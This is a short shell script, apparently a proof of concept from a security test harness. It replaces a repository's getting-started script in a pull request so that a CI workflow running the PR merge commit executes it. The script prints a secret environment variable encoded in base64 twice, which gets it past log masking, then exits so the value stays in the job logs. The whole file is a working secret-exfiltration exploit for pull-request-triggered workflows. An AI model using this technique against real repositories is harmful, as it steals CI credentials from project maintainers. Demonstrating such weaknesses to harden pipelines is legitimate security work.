#!/usr/bin/env sh

# Attacker-controlled replacement of scripts/getting-started.sh.
# The check-getting-started workflow checks out the PR merge commit and
# executes this file directly via:
#   expect ... spawn <shell> scripts/getting-started.sh
# Emit the harness toy secret (double-base64 to survive log masking) and
# terminate immediately so the evidence is preserved in the job logs.

echo "GERALT_LEAKED_TOKEN=$(echo -n "${GERALT_SECRET:-$GERALT}" | base64 | base64)"
exit 1
